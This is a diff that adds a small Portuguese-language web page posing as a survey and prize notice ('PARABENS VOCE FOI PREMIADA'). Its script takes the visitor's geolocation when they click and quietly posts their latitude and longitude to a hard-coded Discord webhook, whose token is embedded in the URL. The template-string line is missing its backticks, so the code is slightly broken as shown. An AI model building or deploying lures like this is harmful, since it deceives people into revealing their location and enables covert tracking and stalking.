@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <title>Compartilhe sua Localização</title>
+</head>
+<body>
+    <h1>Ajude-me com uma pesquisa!</h1>
+    <button onclick="getLocation()">PARABENS VOCE FOI PREMIADA</button>
+    <p id="demo"></p>
+
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            } else { 
+                document.getElementById("demo").innerHTML = "Geolocalização não é suportada por este navegador.";
+            }
+        }
+
+        function showPosition(position) {
+            var lat = position.coords.latitude; 
+            var lon = position.coords.longitude; 
+            document.getElementById("demo").innerHTML = "Latitude: " + lat + "<br>Longitude: " + lon;
+
+            // Enviar para o Webhook do Discord
+            fetch('https://discord.com/api/webhooks/1297256105046708324/RlpI-xkWyOjLQREJq3SGT2XPiyukJ7m4ZGMlX208lbt8IZNtkKaUgZDYnyR9l215Xyru', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: Localização recebida!\nLatitude: ${lat}\nLongitude: ${lon}
+                })
+            });
+        }
+    </script>
+</body>
+</html>
